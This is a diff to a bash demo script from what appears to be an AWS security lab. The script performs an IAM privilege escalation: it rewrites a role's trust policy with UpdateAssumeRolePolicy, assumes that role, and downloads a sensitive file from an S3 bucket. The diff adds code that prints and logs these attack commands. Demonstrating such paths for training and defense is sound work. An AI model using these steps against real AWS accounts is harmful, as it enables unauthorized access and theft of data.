@@ -3,7 +3,6 @@
 # Demo script for iam:UpdateAssumeRolePolicy privilege escalation to S3 bucket
 # This is a ROLE-BASED one-hop scenario
 
-set -e
 
 # Disable AWS CLI paging
 export AWS_PAGER=""
@@ -13,6 +12,24 @@ RED='\033[0;31m'
 GREEN='\033[0;32m'
 YELLOW='\033[1;33m'
 NC='\033[0m' # No Color
+
+# Dim color for command display
+DIM='\033[2m'
+CYAN='\033[0;36m'
+
+# Track attack commands for summary
+ATTACK_COMMANDS=()
+
+# Display a command before executing it
+show_cmd() {
+    echo -e "${DIM}\$ $*${NC}"
+}
+
+# Display AND record an attack command
+show_attack_cmd() {
+    echo -e "\n${CYAN}\$ $*${NC}"
+    ATTACK_COMMANDS+=("$*")
+}
 
 # Configuration
 STARTING_USER="pl-prod-iam-012-to-bucket-starting-user"
@@ -55,6 +72,7 @@ cd - > /dev/null  # Return to scenario directory
 
 # Step 2: Verify identity as user
 echo -e "${YELLOW}Step 2: Verifying identity${NC}"
+show_cmd aws sts get-caller-identity --query 'Arn' --output text
 CURRENT_IDENTITY=$(aws sts get-caller-identity --query 'Arn' --output text)
 echo "Current identity: $CURRENT_IDENTITY"
 
@@ -68,6 +86,7 @@ echo -e "${GREEN}✓ Verified identity as $STARTING_USER${NC}\n"
 echo -e "${YELLOW}Step 3: Assuming starting role${NC}"
 echo "Role ARN: $STARTING_ROLE_ARN"
 
+show_cmd aws sts assume-role --role-arn "$STARTING_ROLE_ARN" --role-session-name "iam-012-demo-session"
 ASSUME_ROLE_OUTPUT=$(aws sts assume-role \
     --role-arn "$STARTING_ROLE_ARN" \
     --role-session-name "iam-012-demo-session")
@@ -83,6 +102,7 @@ echo -e "${GREEN}✓ Successfully assumed role $STARTING_ROLE${NC}\n"
 echo -e "${YELLOW}Step 4: Checking current trust policy of target role${NC}"
 echo "Target role ARN: $TARGET_ROLE_ARN"
 
+show_cmd aws iam get-role --role-name $TARGET_ROLE --query 'Role.AssumeRolePolicyDocument' --output json
 CURRENT_TRUST_POLICY=$(aws iam get-role --role-name $TARGET_ROLE --query 'Role.AssumeRolePolicyDocument' --output json)
 echo "Current trust policy:"
 echo "$CURRENT_TRUST_POLICY" | jq '.'
@@ -92,6 +112,7 @@ echo "$CURRENT_TRUST_POLICY" > /tmp/original_trust_policy_iam_012_bucket.json
 
 # Try to assume the target role (should fail)
 echo -e "\n${YELLOW}Attempting to assume target role (should fail)...${NC}"
+show_cmd aws sts assume-role --role-arn "$TARGET_ROLE_ARN" --role-session-name test-session
 if aws sts assume-role --role-arn "$TARGET_ROLE_ARN" --role-session-name test-session &> /dev/null; then
     echo -e "${RED}⚠ Unexpectedly able to assume target role already${NC}"
 else
@@ -102,6 +123,7 @@ echo ""
 # Step 5: Verify we don't have S3 bucket access yet
 echo -e "${YELLOW}Step 5: Verifying we don't have S3 bucket access yet${NC}"
 echo "Attempting to list S3 bucket contents (should fail)..."
+show_cmd aws s3 ls s3://$BUCKET_NAME/
 if aws s3 ls s3://$BUCKET_NAME/ &> /dev/null; then
     echo -e "${RED}⚠ Unexpectedly have bucket access already${NC}"
 else
@@ -133,6 +155,7 @@ echo "New trust policy to be applied:"
 echo "$NEW_TRUST_POLICY" | jq '.'
 
 # Update the trust policy
+show_attack_cmd aws iam update-assume-role-policy --role-name $TARGET_ROLE --policy-document "$NEW_TRUST_POLICY"
 aws iam update-assume-role-policy \
     --role-name $TARGET_ROLE \
     --policy-document "$NEW_TRUST_POLICY"
@@ -146,6 +169,7 @@ echo ""
 
 # Step 7: Assume the target role
 echo -e "${YELLOW}Step 7: Assuming the target role${NC}"
+show_attack_cmd aws sts assume-role --role-arn "$TARGET_ROLE_ARN" --role-session-name bucket-access-session --output json
 TARGET_CREDENTIALS=$(aws sts assume-role \
     --role-arn "$TARGET_ROLE_ARN" \
     --role-session-name bucket-access-session \
@@ -157,6 +181,7 @@ export AWS_SECRET_ACCESS_KEY=$(echo "$TARGET_CREDENTIALS" | jq -r '.Credentials.
 export AWS_SESSION_TOKEN=$(echo "$TARGET_CREDENTIALS" | jq -r '.Credentials.SessionToken')
 
 # Verify target role assumption
+show_cmd aws sts get-caller-identity --query 'Arn' --output text
 TARGET_IDENTITY=$(aws sts get-caller-identity --query 'Arn' --output text)
 echo "New identity: $TARGET_IDENTITY"
 echo -e "${GREEN}✓ Successfully assumed target role!${NC}\n"
@@ -166,12 +191,14 @@ echo -e "${YELLOW}Step 8: Accessing S3 bucket${NC}"
 echo "Target bucket: $BUCKET_NAME"
 echo "Listing bucket contents..."
 
+show_attack_cmd aws s3 ls s3://$BUCKET_NAME/
 aws s3 ls s3://$BUCKET_NAME/
 echo -e "${GREEN}✓ Successfully listed bucket contents!${NC}\n"
 
 # Step 9: Download sensitive data
 echo -e "${YELLOW}Step 9: Downloading sensitive data${NC}"
 DOWNLOAD_FILE="/tmp/iam-012-sensitive-data.txt"
+show_attack_cmd aws s3 cp s3://$BUCKET_NAME/sensitive-data.txt $DOWNLOAD_FILE
 aws s3 cp s3://$BUCKET_NAME/sensitive-data.txt $DOWNLOAD_FILE
 
 echo -e "\n${GREEN}✓ Successfully downloaded sensitive file${NC}"
@@ -193,6 +220,15 @@ echo ""
 echo -e "${YELLOW}Attack Path:${NC}"
 echo -e "  $STARTING_USER → (AssumeRole) → $STARTING_ROLE → (UpdateAssumeRolePolicy) → $TARGET_ROLE → S3 Bucket"
 echo ""
+
+if [ ${#ATTACK_COMMANDS[@]} -gt 0 ]; then
+    echo -e "${YELLOW}Attack Commands:${NC}"
+    for cmd in "${ATTACK_COMMANDS[@]}"; do
+        echo -e "  ${CYAN}\$ ${cmd}${NC}"
+    done
+fi
+echo ""
+
 echo -e "${GREEN}Downloaded file location: $DOWNLOAD_FILE${NC}"
 echo ""
 echo -e "${RED}IMPORTANT: Run cleanup_attack.sh to restore the original trust policy${NC}"
